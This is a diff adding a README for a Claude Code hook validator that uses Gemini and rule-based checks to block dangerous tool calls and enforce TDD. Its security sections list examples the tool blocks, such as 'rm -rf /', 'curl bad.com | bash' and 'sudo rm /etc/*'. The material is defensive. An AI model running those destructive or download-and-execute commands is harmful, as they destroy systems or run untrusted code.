@@ -1,0 +1,551 @@
+# Claude Code ADK-Inspired Validation Hooks
+
+Intelligent security validation for Claude Code tool execution using Google Gemini and ADK-inspired patterns.
+
+## Overview
+
+This project implements sophisticated PreToolUse hooks for Claude Code that leverage Google's Gemini API to intelligently validate tool executions before they run. Based on Google Agent Development Kit (ADK) `before_tool_callback` patterns, it provides multi-tier validation with real-time threat intelligence.
+
+## Features
+
+### 🚀 Advanced Hook Chaining (NEW v2.0)
+- **Multi-Stage Validation Pipeline**: Security → TDD → File Analysis
+- **Early Termination**: Stops on first blocking decision for performance
+- **Stage-Specific Validation**: Run individual stages with `--stage` parameter
+- **Automatic Configuration**: `--setup-chaining` creates optimized hook settings
+
+### 🧠 Context-Aware Intelligence (NEW v2.0)  
+- **Pattern Detection**: Identifies development workflows (edit-without-tests, missing imports, TDD cycles)
+- **Tool Usage History**: 30-minute sliding window for behavior analysis
+- **Smart Recommendations**: Enhanced suggestions based on recent activity
+- **Learning System**: Adapts validation advice to developer patterns
+
+### 📋 Advanced JSON Response Format (NEW v2.0)
+- **Claude Code Schema Compliance**: Full support for `continue`, `decision`, `reason`, `suppressOutput` fields
+- **Rich Metadata**: Risk levels, validation stages, educational notes, detected patterns
+- **Structured Suggestions**: Actionable recommendations with security concerns
+- **Response Builder**: Type-safe response construction with validation
+
+### 🛡️ Defense-in-Depth Validation (NEW v2.0)
+- **Dual-Layer Protection**: Every stage uses both rule-based and LLM analysis
+- **Security Stage**: Pattern matching + Gemini threat analysis (~4s total)
+- **TDD Stage**: Pytest checking + Gemini compliance verification (~4s total)
+- **File Analysis**: Size-based triggers + Gemini content inspection
+- **Fail-Safe Design**: LLM errors never block legitimate operations
+
+### Advanced Capabilities
+- **Structured Output**: Pydantic models ensure reliable JSON responses
+- **Google Search Integration**: Real-time threat intelligence and security best practices
+- **Thinking Budget**: 24576 tokens for deep security reasoning
+- **File Upload Analysis**: Enhanced security analysis for large files (>500 chars)
+- **Document Processing**: Comprehensive analysis of file contents
+- **Precise Secret Detection**: Improved patterns with reduced false positives
+
+### 🧪 Test-Driven Development Enforcement (v1.2.1)
+- **FileStorage-Based Validation**: Uses persistent file storage instead of real-time pytest execution
+- **Python-Specific TDD Prompts**: Advanced prompts in prompts/ directory for TDD analysis
+- **Pytest Reporter Plugin**: Captures test results via pytest plugin for validation
+- **Smart Language Detection**: Only enforces TDD for programming files (.py, .js, .ts, .go, etc.)
+- **Red Phase Enforcement**: Blocks implementation without failing tests
+- **Green Phase Support**: Allows implementation when tests are failing
+- **Refactor Phase**: Permits changes when all tests pass
+- **Test File Recognition**: Allows test_*.py, *.test.js patterns
+- **Configuration Files**: Skips validation for .json, .yml, .md files
+- **Error Handling**: Fallback to rule-based validation when LLM fails
+
+### Security Patterns Detected
+- Destructive commands (`rm -rf /`, `mkfs`, `dd`)
+- Real credential assignments (quoted values, specific formats)
+- Shell injection patterns
+- Path traversal attempts
+- Malicious download patterns (`curl | bash`)
+- System directory modifications
+- AWS keys, JWTs, GitHub tokens, and other known secret formats
+
+### Tool Enforcement (Blocked Commands)
+- **grep** → Enforces `rg` (ripgrep) for better performance
+- **find** → Enforces `rg --files` alternatives for modern searching  
+- **python/python3** → Enforces `uv run python` for proper dependency management
+
+- **git checkout** → Enforces `gh issue develop` for better issue tracking
+- **cat > file** → Enforces `Write/Edit` tools for file creation with validation
+
+### Development Best Practices
+- **No Emojis**: Code must not contain emojis for compatibility and professionalism
+- **Branch Protection**: Direct editing on main/master branch is blocked
+- **Documentation via Issues**: New .md files (except README, CLAUDE, etc.) must use GitHub issues
+- **Issue-Driven Development**: Use `gh issue develop` to create feature branches linked to issues
+
+### Python TDD Enforcement (v1.2.1)
+- **FileStorage-Based Architecture**: Uses persistent file storage instead of real-time pytest execution
+- **Advanced TDD Prompts**: Python-specific prompts in prompts/ directory for sophisticated analysis
+- **Pytest Reporter Plugin**: Captures test results via pytest_reporter.py plugin
+- **Test Result Processing**: Formats pytest JSON output into structured TDD analysis
+- **Virtual Environment Detection**: Automatically detects and uses project venv via python_env_detector.py
+- **TDD States Tracked**:
+  - **RED**: Writing failing tests (allowed)
+  - **GREEN**: Making tests pass with minimal code (allowed)  
+  - **REFACTOR**: Improving code with all tests passing (allowed)
+  - **VIOLATION**: Writing code without tests, removing tests, etc. (blocked)
+- **Error Handling**: Graceful fallback to rule-based validation when LLM analysis fails
+
+## Installation
+
+### Quick Start with uvx (Recommended)
+
+```bash
+# Basic single-stage validation setup
+uvx claude-code-adk-validator --setup
+
+# Advanced multi-stage hook chaining (NEW v2.0)
+uvx claude-code-adk-validator --setup-chaining
+
+# Or install globally
+uv tool install claude-code-adk-validator
+```
+
+### Prerequisites
+- Python 3.10+
+- `uv` package manager
+- Google Gemini API access
+
+### Manual Installation
+
+1. **Clone and setup environment:**
+```bash
+git clone https://github.com/jihunkim0/jk-hooks-gemini-challenge.git
+cd jk-hooks-gemini-challenge
+uv sync
+```
+
+2. **Configure environment:**
+```bash
+export GEMINI_API_KEY="your_actual_gemini_api_key"
+```
+
+3. **Configure Claude Code hooks:**
+
+#### Basic Single-Stage Configuration
+Create/update `.claude/settings.local.json`:
+```json
+{
+  "hooks": {
+    "PreToolUse": [
+      {
+        "matcher": "Write|Edit|Bash|MultiEdit|Update",
+        "hooks": [
+          {
+            "type": "command", 
+            "command": "uvx claude-code-adk-validator",
+            "timeout": 8000
+          }
+        ]
+      }
+    ]
+  }
+}
+```
+
+#### Advanced Hook Chaining Configuration (NEW v2.0)
+For multi-stage validation pipeline:
+```json
+{
+  "hooks": {
+    "PreToolUse": [
+      {
+        "matcher": "Write|Edit|MultiEdit|Update",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "uvx claude-code-adk-validator --stage=security",
+            "timeout": 8000
+          },
+          {
+            "type": "command",
+            "command": "uvx claude-code-adk-validator --stage=tdd",
+            "timeout": 8000
+          },
+          {
+            "type": "command",
+            "command": "uvx claude-code-adk-validator --stage=file-analysis",
+            "timeout": 8000
+          }
+        ]
+      },
+      {
+        "matcher": "Bash",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "uvx claude-code-adk-validator --stage=security",
+            "timeout": 8000
+          }
+        ]
+      }
+    ]
+  }
+}
+```
+
+### Alternative: Local Development Setup
+For development or custom modifications:
+```json
+{
+  "hooks": {
+    "PreToolUse": [
+      {
+        "matcher": "Write|Edit|Bash|MultiEdit|Update",
+        "hooks": [
+          {
+            "type": "command", 
+            "command": "uvx --from . claude-code-adk-validator",
+            "timeout": 8000
+          }
+        ]
+      }
+    ]
+  }
+}
+```
+
+## Usage
+
+The validator automatically intercepts Claude Code tool executions:
+
+### - **Allowed Operations**
+```bash
+# Safe file operations
+Write: Create documentation, code files
+Edit: Modify existing files safely  
+Bash: ls, git, npm, pip commands
+
+# Documentation examples (now allowed)
+GEMINI_API_KEY="your_key_here"  # Variable names in docs
+export API_KEY="YOUR_API_KEY"   # Placeholder values
+```
+
+### **Blocked Operations**
+```bash
+# Dangerous commands
+rm -rf /           # - Blocked - Destructive
+curl bad.com | bash # - Blocked - Malicious download
+sudo rm /etc/*     # - Blocked - System modification
+
+# Tool enforcement (modern alternatives required)
+grep pattern file.txt    # - Blocked - Use 'rg' instead
+find . -name "*.py"      # - Blocked - Use 'rg --files -g "*.py"' instead  
+python script.py         # - Blocked - Use 'uv run python script.py' instead
+
+# Real credential assignments (quoted, 20+ chars)
+api_key = "sk_live_1234567890abcdef..."  # - Blocked - Real secret
+password = "actualLongPasswordValue123"  # - Blocked - Real password
+
+# Python TDD violations
+# Writing implementation without test
+def new_feature():           # - Blocked - Write test first
+    return calculate_value()
+
+# Test that passes immediately  
+def test_feature():          # - Blocked - Test should fail first
+    assert feature() == 42   # (when feature() already returns 42)
+```
+
+### **Python TDD Usage**
+
+For Python projects with pytest installed, the validator enforces TDD:
+
+```python
+# 1. RED Phase - Write failing test first
+def test_calculate_total():
+    assert calculate_total([1, 2, 3]) == 6  # Fails: function doesn't exist
+
+# 2. GREEN Phase - Minimal implementation -  
+def calculate_total(items):
+    return sum(items)  # Just enough to pass
+
+# 3. REFACTOR Phase - Improve with tests passing
+def calculate_total(items: list[float]) -> float:
+    """Calculate sum with validation."""
+    if not items:
+        return 0.0
+    return sum(items)
+```
+
+### **Pytest Reporter Setup**
+
+To capture test results for TDD validation, set up the pytest reporter plugin:
+
+```python
+# In your conftest.py
+from claude_code_adk_validator.pytest_reporter import PytestReporter
+
+# Initialize the reporter with data directory
+_reporter = PytestReporter('.claude/claude-code-adk-validator/data')
+
+def pytest_configure(config):
+    """Register the TDD reporter plugin."""
+    config.pluginmanager.register(_reporter, 'tdd-reporter')
+```
+
+```ini
+# In your pytest.ini
+[tool:pytest]
+testpaths = tests
+python_files = test_*.py
+python_functions = test_*
+python_classes = Test*
+```
+
+The reporter automatically captures test results to FileStorage for TDD validation.
+
+### **Response Codes**
+- `Exit 0`: Operation approved 
+- `Exit 2`: Operation blocked (with reason in stderr)
+
+## Testing
+
+Run comprehensive validation tests:
+
+```bash
+# Full validation test suite (27 scenarios)
+uv run python tests/test_validation.py
+
+# Python TDD tests (14 scenarios)
+uv run python -m pytest tests/test_python_tdd.py -v
+
+# Integration tests for advanced features (NEW v2.0)
+uv run python tests/test_integration_advanced_features.py
+
+# Hook chaining tests
+uv run python tests/test_hook_chaining.py
+
+# Advanced JSON response tests
+uv run python tests/test_advanced_responses.py
+
+# Context-aware response tests
+uv run python tests/test_context_aware_responses.py
+
+# Code quality checks (all must pass)
+uvx ruff check claude_code_adk_validator/
+uvx mypy claude_code_adk_validator/  
+uvx black --check claude_code_adk_validator/
+
+# Auto-fix formatting and linting issues
+uvx black claude_code_adk_validator/
+uvx ruff check --fix claude_code_adk_validator/
+```
+
+## Architecture
+
+### Core Components
+
+1. **ClaudeToolValidator** (`claude_code_adk_validator/validator.py`)
+   - Main validation engine
+   - File upload and analysis
+   - Structured output generation
+   - Improved secret detection
+   - Python TDD integration
+
+2. **TDD Validation System (v1.2.1)**
+   - **TDDValidator** (`validators/tdd_validator.py`): Python TDD enforcement with FileStorage
+   - **FileStorage** (`file_storage.py`): Persistent test result storage
+   - **PytestReporter** (`pytest_reporter.py`): Captures pytest results
+   - **PythonEnvDetector** (`python_env_detector.py`): Detects virtual environments
+   - **TDD Prompts** (`prompts/`): Python-specific TDD analysis prompts
+     - `tdd_core_principles.py`: Core TDD principles and patterns
+     - `write_analysis.py`: Write operation analysis prompts
+     - `edit_analysis.py`: Edit operation analysis prompts
+     - `python_error_mappings.py`: Python error interpretation
+
+3. **Validation Tiers**
+   - **Quick validation**: Rule-based pattern matching
+   - **Gemini analysis**: LLM-powered threat assessment  
+   - **File analysis**: Enhanced security scanning for large files
+   - **TDD validation**: Python-specific TDD enforcement with FileStorage
+   - **Context analysis**: Smart workflow pattern detection
+
+4. **Response Models (v1.2.1)**
+   - `HookResponse`: Claude Code compliant JSON responses with rich metadata
+   - `ResponseBuilder`: Type-safe response construction utilities
+   - `ValidationStage`: Pipeline stage identification (security, tdd, file_analysis)
+   - `RiskLevel`: Categorized risk assessment (low, medium, high, critical)
+
+5. **Context Intelligence (v1.2.1)**
+   - `ToolUsageEvent`: Historical tool usage tracking
+   - `ContextAnalyzer`: Pattern detection (edit-without-tests, missing imports, TDD cycles)
+   - Tool usage history with 30-minute sliding window
+   - Enhanced recommendations based on developer behavior
+
+6. **Security Validation**
+   - **SecurityValidator** (`validators/security_validator.py`): Fast rule-based + context-aware security
+   - **FileAnalysisValidator** (`validators/file_analysis_validator.py`): Enhanced file scanning
+
+### Secret Detection Improvements
+
+Enhanced patterns with reduced false positives:
+
+- **Word boundaries**: Prevents matching variable names like `GEMINI_API_KEY`
+- **Placeholder exclusion**: Ignores `YOUR_API_KEY`, `<SECRET>`, etc.
+- **Quoted value requirements**: Focuses on actual string assignments
+- **Minimum length**: Requires 20+ characters for generic secrets
+- **Specific formats**: Detects AWS keys, JWTs, GitHub tokens directly
+
+### ADK Integration Patterns
+
+Following Google ADK `before_tool_callback` methodology:
+
+```python
+def before_tool_callback(self, tool_request: dict) -> Optional[dict]:
+    """ADK-inspired validation returning None (allow) or error dict (block)"""
+    validation_result = self.validate_tool_use(tool_name, tool_input, context)
+    return None if validation_result["approved"] else {"error": validation_result["reason"]}
+```
+
+## Configuration
+
+### Environment Variables
+- `GEMINI_API_KEY`: Required for Gemini API access
+- Missing key allows all operations (fail-safe mode)
+
+### Hook Configuration
+- **Matcher**: `Write|Edit|Bash|MultiEdit|Update` - Tools to validate
+- **Timeout**: 8000ms - Adequate for file upload analysis
+- **Command**: Full path to validator script
+
+### Model Settings
+- **Model**: `gemini-2.5-flash` - Optimized for speed and accuracy
+- **Thinking Budget**: 24576 tokens for complex reasoning
+- **Structured Output**: JSON schema validation via Pydantic
+
+## Development
+
+### Project Structure
+```
+claude-code-adk-validator/
+   claude_code_adk_validator/
+      __init__.py               # Package metadata
+      main.py                   # CLI entry point
+      validator.py              # Main validation engine
+      hook_response.py          # Advanced JSON response models
+      context_analyzer.py       # Context-aware intelligence
+      file_storage.py           # Persistent test result storage (NEW v1.2.1)
+      pytest_reporter.py       # Pytest result capture plugin (NEW v1.2.1)
+      python_env_detector.py   # Virtual environment detection
+      validators/               # Modular validation pipeline
+         security_validator.py  # Security + context awareness
+         tdd_validator.py       # Python TDD enforcement with FileStorage
+         file_analysis_validator.py # Enhanced file scanning
+      prompts/                  # Python-specific TDD prompts (NEW v1.2.1)
+         tdd_core_principles.py # Core TDD principles and patterns
+         write_analysis.py      # Write operation analysis prompts
+         edit_analysis.py       # Edit operation analysis prompts
+         python_error_mappings.py # Python error interpretation
+   tests/
+      test_validation.py        # Core validation tests (27 scenarios)
+      test_tdd_e2e.py          # End-to-end TDD tests (NEW v1.2.1)
+      test_file_storage.py     # FileStorage tests (NEW v1.2.1)
+      test_pytest_reporter.py  # Pytest reporter tests (NEW v1.2.1)
+      test_python_env_detector.py # Environment detector tests (NEW v1.2.1)
+      test_hook_chaining.py     # Hook chaining tests
+      test_advanced_responses.py # JSON response tests
+      test_context_aware_responses.py # Context intelligence tests
+      test_integration_advanced_features.py # Integration tests
+   .github/
+      workflows/               # CI/CD automation
+   pyproject.toml              # Package configuration
+   CLAUDE.md                   # Development guidance
+   CONTRIBUTING.md             # Contribution guidelines
+   LICENSE                     # MIT License
+   README.md                   # This file
+```
+
+### Adding New Security Patterns
+
+1. **Rule-based patterns** (Tier 1): Add to `validate_bash_command()` or `validate_file_operation()`
+2. **LLM analysis** (Tier 2): Update validation prompt in `build_validation_prompt()`
+3. **File analysis** (Tier 3): Enhance `analyze_uploaded_file()` prompt
+
+See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
+
+## Contributing
+
+1. Follow existing code patterns and security principles
+2. Add tests for new validation patterns in `tests/`
+3. Run quality checks: `uvx ruff`, `uvx mypy`, `uvx black`
+4. Update documentation for new features
+
+See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed contribution guidelines.
+
+## Security Considerations
+
+- **Fail-safe**: Missing API key allows operations (prevents lockout)
+- **Performance**: Quick validation for common patterns
+- **Privacy**: Temporary files cleaned up after analysis
+- **Reliability**: Structured output prevents parsing errors
+- **Precision**: Improved secret detection reduces false positives
+
+## Recent Improvements
+
+### TDD Validation Enhancement v1.2.1 (Latest)
+
+#### 🗄️ FileStorage-Based Architecture
+- **Persistent test result storage**: Uses FileStorage instead of real-time pytest execution
+- **Improved reliability**: Decouples validation from pytest execution timing
+- **Better error handling**: Graceful fallback to rule-based validation
+- **Performance optimization**: Avoids expensive pytest subprocess calls
+
+#### 🐍 Python-Specific TDD Prompts
+- **Advanced prompt system**: Specialized prompts in `prompts/` directory
+- **Core TDD principles**: Comprehensive TDD patterns and error mappings
+- **Operation-specific analysis**: Different prompts for Write vs Edit operations
+- **Python error interpretation**: Maps Python errors to TDD violations
+
+#### 📊 Enhanced Pytest Integration
+- **Pytest reporter plugin**: Captures test results via `pytest_reporter.py`
+- **TDD Guard format**: Formats test results similar to tdd-guard output
+- **Virtual environment detection**: Automatically detects project environments
+- **Test result processing**: Structured analysis of pytest JSON output
+
+#### 🧪 Comprehensive Testing Infrastructure
+- **End-to-end TDD tests**: `test_tdd_e2e.py` for complete workflow validation
+- **FileStorage tests**: `test_file_storage.py` for storage functionality
+- **Pytest reporter tests**: `test_pytest_reporter.py` for plugin validation
+- **Environment detector tests**: `test_python_env_detector.py` for venv detection
+- **Quality assurance**: All tests pass with mypy, black, and ruff compliance
+
+### Enhanced Secret Detection (v1.2)
+- Added word boundaries to prevent false positives on variable names
+- Implemented placeholder exclusion for documentation examples
+- Focus on quoted values for generic secret patterns
+- Added specific patterns for AWS, GitHub, Stripe, Slack tokens
+- Reduced false positives while maintaining security coverage
+
+## Troubleshooting
+
+### Hooks Not Triggering
+If the validator isn't blocking operations:
+
+1. **Check global settings**: Ensure `~/.claude/settings.json` has the hook configuration
+2. **Check local overrides**: Look for `.claude/settings.local.json` which may override global settings
+3. **Restart Claude Code**: Hook configuration changes require restart
+4. **Test manually**: Verify the validator works directly:
+   ```bash
+   # Create test JSON file
+   echo '{"tool_name":"Write","tool_input":{"file_path":"test.py","content":"def foo():\\n    pass"}}' > test.json
+   cat test.json | uv run python -m claude_code_adk_validator --stage=tdd
+   # Should output: "TDD Violation: Creating implementation without visible test output. Write tests first!"
+   ```
+
+### Common Error Messages
+- **"Invalid JSON input"**: Check JSON escaping in hook commands
+- **"GEMINI_API_KEY not configured"**: Set environment variable for LLM features
+- **"Tool enforcement violation"**: Use suggested modern alternatives (rg, uv)
+
+### Performance Issues
+- **Rule-based only**: ~1.3 seconds (fast)
+- **With LLM analysis**: ~4 seconds (defense-in-depth)
+- **Disable LLM**: Remove `GEMINI_API_KEY` for faster validation
+
+## License
+
+MIT License - See LICENSE file for details
